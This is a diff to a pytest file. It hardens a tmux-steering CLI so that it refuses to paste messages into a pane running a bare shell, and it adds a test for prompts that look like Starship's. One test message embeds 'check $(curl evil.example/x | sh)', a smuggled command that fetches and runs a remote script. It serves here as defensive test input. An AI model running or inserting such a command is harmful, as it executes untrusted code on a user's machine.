@@ -58,10 +58,12 @@ class FakeClock:
 
 class FakeRun:
     """Fake tmux runner. `panes` is the capture-pane script: successive
-    capture-pane calls pop from the list, and the last entry repeats."""
+    capture-pane calls pop from the list, and the last entry repeats.
+    `pane_cmd` is the foreground process `display-message` reports."""
 
-    def __init__(self, panes):
+    def __init__(self, panes, pane_cmd="muse"):
         self.panes = list(panes)
+        self.pane_cmd = pane_cmd
         self.calls = []
 
     def __call__(self, *argv, **kw):
@@ -74,6 +76,14 @@ class FakeRun:
                 stdout = out.encode()
                 stderr = b""
 
+            return P()
+        if argv[1] == "display-message":
+
+            class P:
+                returncode = 0
+                stderr = b""
+
+            P.stdout = self.pane_cmd.encode()
             return P()
 
         class P:
@@ -90,8 +100,8 @@ class FakeRun:
         return [c for c in self.calls if c[1] == "paste-buffer"]
 
 
-def steer_harness(cli, monkeypatch, panes, tmux_up=True):
-    fr = FakeRun(panes)
+def steer_harness(cli, monkeypatch, panes, tmux_up=True, pane_cmd="muse"):
+    fr = FakeRun(panes, pane_cmd=pane_cmd)
     monkeypatch.setattr(cli, "run", fr)
     monkeypatch.setattr(cli, "tmux_alive", lambda slug: tmux_up)
     monkeypatch.setattr(cli, "time", FakeClock())
@@ -123,26 +133,45 @@ SHELL_PANE = "ntindle@spark-vm:~/work$ "
 
 
 def test_live_tui_recognized(cli):
-    assert cli._pane_shows_live_tui(LIVE_PANE) is True
+    assert cli._pane_shows_live_tui(LIVE_PANE, "muse") is True
+
+
+def test_live_tui_under_node_recognized(cli):
+    # The TUI may run as the `muse` launcher or the node process itself.
+    assert cli._pane_shows_live_tui(LIVE_PANE, "node") is True
 
 
 def test_live_tui_with_typed_text_recognized(cli):
-    assert cli._pane_shows_live_tui(LIVE_PANE_WITH_TEXT) is True
+    assert cli._pane_shows_live_tui(LIVE_PANE_WITH_TEXT, "muse") is True
 
 
 def test_dead_shell_rejected(cli):
-    assert cli._pane_shows_live_tui(SHELL_PANE) is False
+    assert cli._pane_shows_live_tui(SHELL_PANE, "bash") is False
 
 
 def test_stale_input_box_in_scrollback_rejected(cli):
     # The `❯` is there, but the LAST line is a shell prompt. Marker must be
     # positional, not substring.
-    assert cli._pane_shows_live_tui(DEAD_PANE) is False
+    assert cli._pane_shows_live_tui(DEAD_PANE, "bash") is False
+
+
+def test_starship_style_prompt_rejected(cli):
+    # Security BLOCKING 2: Starship's default prompt character IS `❯`, so a
+    # dead pane can pass the content heuristic deterministically. The
+    # foreground-process signal must still refuse.
+    assert cli._pane_shows_live_tui("❯ ", "bash") is False
+    assert cli._pane_shows_live_tui("❯ ", "zsh") is False
+
+
+def test_live_marker_with_shell_process_rejected(cli):
+    # Marker present but the foreground process is a shell: refuse.
+    assert cli._pane_shows_live_tui(LIVE_PANE, "bash") is False
 
 
 def test_empty_pane_rejected(cli):
-    assert cli._pane_shows_live_tui("") is False
-    assert cli._pane_shows_live_tui("\n   \n") is False
+    assert cli._pane_shows_live_tui("", "muse") is False
+    assert cli._pane_shows_live_tui("\n   \n", "muse") is False
+    assert cli._pane_shows_live_tui(LIVE_PANE, "") is False
 
 
 # --- _steer refuses dead panes ------------------------------------------------
@@ -160,6 +189,16 @@ def test_steer_refuses_bare_shell_prompt(cli, monkeypatch):
     fr = steer_harness(cli, monkeypatch, [SHELL_PANE])
     with pytest.raises(RuntimeError, match="does not show a live TUI"):
         cli._steer("demo", "harmless message")
+    assert fr.pasted() == []
+    assert fr.sent_keys() == []
+
+
+def test_steer_refuses_starship_style_dead_pane(cli, monkeypatch):
+    # End-to-end for Security BLOCKING 2: the dead pane's prompt starts
+    # with `❯` (Starship default), so only the process signal can refuse.
+    fr = steer_harness(cli, monkeypatch, ["❯ "], pane_cmd="bash")
+    with pytest.raises(RuntimeError, match="does not show a live TUI"):
+        cli._steer("demo", "check $(curl evil.example/x | sh)")
     assert fr.pasted() == []
     assert fr.sent_keys() == []
 
